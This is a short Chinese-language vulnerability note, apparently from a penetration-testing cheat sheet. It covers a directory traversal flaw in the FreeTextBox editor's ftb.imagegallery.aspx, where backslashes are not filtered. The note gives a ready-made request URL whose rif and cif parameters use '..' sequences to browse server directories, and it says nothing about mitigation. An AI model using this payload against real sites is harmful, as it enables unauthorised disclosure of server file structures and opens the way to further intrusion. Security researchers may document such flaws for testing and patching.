## Freetextbox

### Freetextbox遍历目录漏洞

影响版本：未知
脆弱描述：
因为ftb.imagegallery.aspx代码中 只过滤了/但是没有过滤\符号所以导致出现了遍历目录的问题。
攻击利用:
在编辑器页面点图片会弹出一个框（抓包得到此地址）构造如下，可遍历目录。
http://127.0.0.1/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&rif=..&cif=\..